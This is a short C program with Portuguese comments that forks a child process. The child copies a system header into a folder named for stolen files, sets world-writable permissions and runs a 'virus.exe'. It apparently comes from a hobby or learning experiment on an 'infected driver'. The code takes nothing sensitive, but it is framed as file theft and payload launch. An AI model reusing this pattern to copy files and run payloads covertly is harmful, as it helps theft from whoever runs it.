#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>

int main()
{
	pid_t child_pid;
	
	child_pid = fork();
	
	if(child_pid == 0)
	{
		/* Roubar STDIO */
		system("cp '/usr/include/stdio.h' /home/luciano/Documentos/Drivers/MeuDriver_Infectado/Arquivos_Roubados/");
		system("chmod 777 /home/luciano/Documentos/Drivers/MeuDriver_Infectado/Arquivos_Roubados/*");
		
		/* Roubar Informações do Modulo */
		system("/home/luciano/Documentos/Drivers/MeuDriver_Infectado/virus.exe");
	}
	
	return 0;
}
